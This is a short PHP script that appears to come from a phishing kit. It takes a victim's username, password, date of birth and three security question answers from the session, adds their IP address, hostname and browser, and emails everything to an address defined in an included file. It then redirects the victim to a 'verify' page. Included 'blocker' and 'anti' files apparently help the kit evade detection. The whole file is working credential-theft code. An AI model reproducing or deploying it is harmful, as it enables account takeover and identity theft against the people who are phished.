<?php
session_start();
include "youremail.php";
include('blocker.php');
include './prevents/anti7.php';
			include './prevents/anti8.php';
				include './prevents/anti9.php';




$user = $_SESSION['user'];
$pass = $_SESSION['password'];
$q1 = $_SESSION['question1'];
$q2 = $_SESSION['question2'];
$q3 = $_SESSION['question3'];

$a1 = $_SESSION['answer1'];
$a2 = $_SESSION['answer2'];
$a3 = $_SESSION['answer3'];

$dob = $_SESSION['dob'];


if (getenv('HTTP_CLIENT_IP')){
	$ip=getenv('HTTP_CLIENT_IP');}
else {
	$ip=getenv('REMOTE_ADDR');}
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$browser = $_SERVER['HTTP_USER_AGENT'];
$data = "
=====================
User: $user
Pass: $pass
DOB: $dob
Q1: $q1
A1: $a1

Q2: $q2
A2: $a2

Q3: $q3
A3: $a3


Ip: $ip,$browser
Host: $hostname
=======M0TU$ by LOG$=========";
 if ($user != "" && $pass != "" && $a1 != "" && strlen($a1)<16 ) {
 $subj = "#mot QA# $user $pass $ip";
mail($to,$subj,$data);

}



header("Location: verify.php");

?>